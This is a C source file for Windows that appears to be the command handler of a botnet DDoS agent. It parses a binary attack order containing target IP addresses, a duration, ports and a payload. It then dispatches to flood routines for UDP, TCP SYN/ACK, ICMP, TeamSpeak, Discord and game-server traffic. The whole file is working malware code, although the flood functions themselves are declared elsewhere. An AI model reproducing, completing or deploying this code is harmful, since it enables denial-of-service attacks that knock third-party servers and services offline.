#include "flood.h"
#include "attacks.h"
#include "rand.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

static uint32_t rd_u32(const uint8_t **p, const uint8_t *end) {
    const uint8_t *b = *p;
    if (b+4 > end) return 0;
    uint32_t v = ((uint32_t)b[0]<<24)|((uint32_t)b[1]<<16)|((uint32_t)b[2]<<8)|((uint32_t)b[3]);
    *p = b+4; return v;
}
static uint8_t rd_u8(const uint8_t **p, const uint8_t *end) {
    const uint8_t *b = *p;
    if (b+1 > end) return 0;
    *p = b+1; return *b;
}

int qv3_flood_parse(const uint8_t *buf, size_t len, qv3_flood *f) {
    const uint8_t *p = buf, *end = buf+len;
    memset(f, 0, sizeof *f);
    f->atk_id = rd_u32(&p,end);
    f->method = rd_u8(&p,end);
    f->duration = rd_u32(&p,end);
    f->target_count = rd_u8(&p,end);
    f->prop_count = rd_u8(&p,end);
    if (f->target_count > 255) return -1;
    unsigned i;
    for (i=0;i<f->target_count;i++) {
        if (p+5 > end) return -1;
        f->targets[i].addr = rd_u32(&p,end);
        f->targets[i].netmask = rd_u8(&p,end);
    }
    if (f->prop_count > 32) return -1;
    for (i=0;i<f->prop_count;i++) {
        uint32_t plen;
        f->props[i].id = rd_u8(&p,end);
        plen = rd_u32(&p,end);
        if (p+plen > end || plen > sizeof(f->props[i].data)) return -1;
        f->props[i].len = plen;
        memcpy(f->props[i].data,p,plen);
        p += plen;
    }
    return 0;
}

/* prop helpers */
static const uint8_t *prop_data(const qv3_flood *f, uint8_t id, uint32_t *len) {
    unsigned i;
    for (i=0;i<f->prop_count;i++) if (f->props[i].id==id){ *len=f->props[i].len; return f->props[i].data; }
    *len=0; return NULL;
}
static int prop_int(const qv3_flood *f, uint8_t id, int def) {
    const uint8_t *d; uint32_t len; d=prop_data(f,id,&len);
    if (!d||len==0) return def;
    return (int)((uint32_t)d[0]<<24|(uint32_t)d[1]<<16|(uint32_t)d[2]<<8|(uint32_t)d[3]);
}
static int prop_u16(const qv3_flood *f, uint8_t id, int def) {
    const uint8_t *d; uint32_t len; d=prop_data(f,id,&len);
    if (!d||len<2) return def;
    return (int)((d[0]<<8)|d[1]);
}
static int prop_hex(const qv3_flood *f, uint8_t id, uint8_t *out, size_t cap, size_t *n) {
    const uint8_t *d; uint32_t len; d=prop_data(f,id,&len);
    if (!d||len==0||len>cap) return -1;
    memcpy(out,d,len); *n=len; return 0;
}

static void target_to_str(const qv3_flood *f, char *out, size_t cap) {
    if (f->target_count<1) { snprintf(out,cap,"127.0.0.1"); return; }
    uint32_t ip = f->targets[0].addr;
    snprintf(out,cap,"%u.%u.%u.%u",(ip>>24)&0xFF,(ip>>16)&0xFF,(ip>>8)&0xFF,ip&0xFF);
}

int qv3_attack_exec(const qv3_flood *f) {
    char target[32]; target_to_str(f,target,sizeof target);
    int dport = prop_u16(f,PROP_DPORT,0);
    int len = prop_int(f,PROP_LENGTH,512);
    int conns = prop_int(f,PROP_CONNS,5);
    int sleep_us = prop_int(f,PROP_SLEEP,0);
    int duration = (int)f->duration;
    uint8_t payload[512]; size_t plen=0;
    prop_hex(f,PROP_PAYLOAD,payload,sizeof payload,&plen);

    switch (f->method) {
    case ATK_UDP_PLAIN:
    case ATK_UDP_RAW:
    case ATK_IPIP_UDP:
        if (plen>0) udp_payload_attack(target,dport,duration,(char*)payload,plen,conns);
        else udp_attack(target,dport,duration,conns);
        break;
    case ATK_APP_SOCKET:
    case ATK_TCP_SYN:
        tcp_attack(target,dport,duration,conns);
        break;
    case ATK_TCP_ACK:
        tcp_rand(target,dport,duration,conns);
        break;
    case ATK_TS3:
        udp_ts3_attack(target,dport,duration,conns);
        break;
    case ATK_DISCORD:
        udp_discord_attack(target,dport,duration,conns);
        break;
    case ATK_ICMP:
        icmp_flood(target,duration,conns);
        break;
    case ATK_VSE:
        udp_samp_attack(target,dport,duration,conns);
        break;
    default:
        udp_attack(target,dport,duration,conns);
        break;
    }
    (void)len; (void)sleep_us;
    return 0;
}
